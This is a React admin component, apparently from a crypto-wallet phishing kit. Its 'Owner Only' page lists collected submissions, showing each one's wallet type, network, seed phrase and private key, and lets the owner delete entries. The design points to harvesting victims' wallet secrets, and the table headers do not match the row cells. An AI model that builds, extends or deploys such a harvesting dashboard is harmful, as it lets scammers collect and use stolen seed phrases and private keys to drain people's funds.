
import React, { useEffect, useState } from "react";
import { toast } from "react-toastify";

export default function SubmissionTable() {
  const [submissions, setSubmissions] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");

  useEffect(() => {
    async function fetchSubmissions() {
      setLoading(true);
      setError("");
      try {
        const res = await fetch(`${import.meta.env.VITE_API_URL}/api/submissions`, {
          credentials: "include",
        });
        if (!res.ok) throw new Error("Failed to fetch submissions");
        const data = await res.json();
        setSubmissions(data);
      } catch (e) {
        setError(e.message || "Error fetching submissions");
      } finally {
        setLoading(false);
      }
    }
    fetchSubmissions();
  }, []);

  return (
    <div className="min-h-screen bg-bg p-6 text-text dark:bg-darkbg dark:text-darktext">
      <div className="mx-auto max-w-[1100px] rounded-xl bg-card p-6 shadow-card dark:bg-darkcard">
        <h1 className="font-montserrat text-2xl font-bold text-primary dark:text-white">
          Submissions (Owner Only)
        </h1>

        {loading ? (
          <p className="mt-4 text-sm">Loading...</p>
        ) : error ? (
          <p className="mt-4 text-sm text-red-500">{error}</p>
        ) : submissions.length === 0 ? (
          <p className="mt-4 text-sm text-black/70 dark:text-white/70">
            No submissions yet.
          </p>
        ) : (
          <div className="mt-4 overflow-x-auto">
            <table className="w-full border-collapse text-sm">
              <thead>
                <tr className="bg-black/5 dark:bg-white/5">
                  <th className="px-3 py-2">Action</th>
                  <th className="px-3 py-2">Wallet Type</th>
                  <th className="px-3 py-2">Network</th>
                  <th className="px-3 py-2">SeedPhrase</th>
                  <th className="px-3 py-2">Private Key</th>
                  <th className="px-3 py-2">Timestamp</th>
                </tr>
              </thead>
              <tbody>
                {submissions.map((sub) => (
                  <tr key={sub._id} className="border-b border-black/10 dark:border-white/10">
                    <td className="px-3 py-2">{sub.action}</td>
                    <td className="px-3 py-2">{sub.walletType}</td>
                    <td className="px-3 py-2">{sub.network}</td>
                    <td className="px-3 py-2">{sub.secretPhrase || "-"}</td>
                    <td className="px-3 py-2">{sub.walletSecret || "-"}</td>
                    <td className="px-3 py-2">{sub.note || "-"}</td>
                    <td className="px-3 py-2">{new Date(sub.createdAt).toLocaleString()}</td>
                    <td className="px-3 py-2">
                      <button
                        onClick={async () => {
                          toast.info(
                            <span>
                              Delete this submission?
                              <button
                                style={{ marginLeft: 12, color: 'white', background: '#ef4444', border: 'none', borderRadius: 4, padding: '2px 8px', cursor: 'pointer' }}
                                onClick={async (e) => {
                                  e.stopPropagation();
                                  try {
                                    const res = await fetch(`${import.meta.env.VITE_API_URL}/api/submissions/${sub._id}`, {
                                      method: "DELETE",
                                      credentials: "include",
                                    });
                                    if (!res.ok) throw new Error("Delete failed");
                                    setSubmissions((prev) => prev.filter((s) => s._id !== sub._id));
                                    toast.dismiss();
                                    toast.success("Submission deleted");
                                  } catch (e) {
                                    toast.dismiss();
                                    toast.error(e.message || "Delete failed");
                                  }
                                }}
                              >
                                Confirm
                              </button>
                            </span>,
                            { autoClose: false }
                          );
                        }}
                        className="rounded bg-red-500 px-3 py-1 text-xs font-semibold text-white hover:bg-red-700"
                      >
                        Delete
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  );
}
